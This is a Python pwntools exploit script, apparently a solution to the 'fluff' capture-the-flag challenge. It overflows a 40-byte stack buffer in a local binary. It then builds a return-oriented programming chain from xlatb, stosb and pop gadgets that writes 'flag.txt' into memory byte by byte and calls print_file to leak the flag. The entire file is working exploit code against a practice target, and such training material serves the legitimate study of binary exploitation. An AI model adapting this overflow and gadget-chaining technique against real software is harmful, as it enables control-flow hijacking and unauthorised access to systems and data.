#!/usr/bin/python3
from pwn import process, p64, log

shell = process("./fluff")

offset = 40
junk = b"A" * offset

strings = [0x4003c8, 0x4003e4, 0x60041a, 0x4003cf, 0x400439, 0x4003f1, 0x4007bc, 0x4003f1]
flag = "flag.txt"

print_file = p64(0x400510)
data = 0x601028

pop_rdi = p64(0x4006a3)
stosb = p64(0x400639)
xlatb = p64(0x400628)
pops = p64(0x40062a)

rax = 0xb

payload  = b""
payload += junk

for i in range(len(flag)):
    payload += pops + p64(0x2000) + p64(strings[i] - 0x3ef2 - rax)
    payload += xlatb
    payload += pop_rdi + p64(data + i)
    payload += stosb
    rax = ord(flag[i])

payload += pop_rdi
payload += p64(data)
payload += print_file

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
